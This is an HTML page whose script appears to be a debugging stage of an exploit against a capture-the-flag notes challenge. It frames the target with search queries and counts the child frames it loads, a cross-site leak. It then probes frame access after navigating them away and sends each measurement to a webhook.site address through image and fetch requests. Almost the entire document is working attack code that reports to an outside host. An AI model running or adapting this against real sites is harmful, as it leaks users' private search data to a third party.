<!DOCTYPE html>
<html><body>
<div id="f"></div>
<script>
const CHALL = 'https://notes.chall.lac.tf';
const WH = 'https://webhook.site/14ee7d0b-ebc0-482a-ba4b-417a92c3f289';
const HEX = '0123456789abcdef';

const imgs = [];
function exfil(d){
    const img = new Image();
    img.src = WH + '?d=' + encodeURIComponent(d);
    imgs.push(img);
    fetch(WH + '?d=' + encodeURIComponent(d), {mode:'no-cors'}).catch(()=>{});
}

// DEBUG: Test one iframe with detailed reporting at multiple time intervals
async function debugTest(query, label) {
    const v = document.createElement('iframe');
    v.style.cssText = 'width:10px;height:10px';
    document.getElementById('f').appendChild(v);

    const t0 = performance.now();
    v.src = CHALL + '/?sandbox=x&referrerPolicy=allow-scripts%20allow-same-origin&search=' + encodeURIComponent(query);

    // Wait for onload
    await new Promise((res) => {
        v.onload = res;
        setTimeout(res, 10000);
    });
    const loadTime = Math.round(performance.now() - t0);

    // Check frames at multiple intervals
    for (const wait of [100, 500, 1000, 2000]) {
        await new Promise(r => setTimeout(r, wait === 100 ? 100 : wait - (wait === 500 ? 100 : wait === 1000 ? 500 : 1000)));
        let len = -1;
        try { len = v.contentWindow.length; } catch(e) { exfil(label + '_' + wait + 'ms_lenERR'); continue; }
        exfil(label + '_' + wait + 'ms_len=' + len);
    }

    // Now navigate all frames to about:blank
    let total = 0;
    try { total = v.contentWindow.length; } catch(e) {}
    let navOK = 0;
    for (let i = 0; i < total; i++) {
        try { v.contentWindow.frames[i].location = 'about:blank'; navOK++; } catch(e) {}
    }
    exfil(label + '_nav=' + navOK + '/' + total);

    // Check access at multiple intervals after navigation
    for (const wait of [300, 800, 1500, 3000]) {
        await new Promise(r => setTimeout(r, wait === 300 ? 300 : wait - (wait === 800 ? 300 : wait === 1500 ? 800 : 1500)));
        let acc = 0, blk = 0;
        for (let i = 0; i < total; i++) {
            try { v.contentWindow.frames[i].document; acc++; } catch(e) { blk++; }
        }
        exfil(label + '_post' + wait + '_acc=' + acc + '_blk=' + blk);
    }

    v.remove();
}

(async () => {
    exfil('DEBUG_START');

    // Test with a query that likely matches (first hex char)
    await debugTest('a', 'MATCH_a');

    // Test with a query that won't match
    await debugTest('zzzzzzzz', 'NOMATCH');

    exfil('DEBUG_DONE');
})();
</script></body></html>
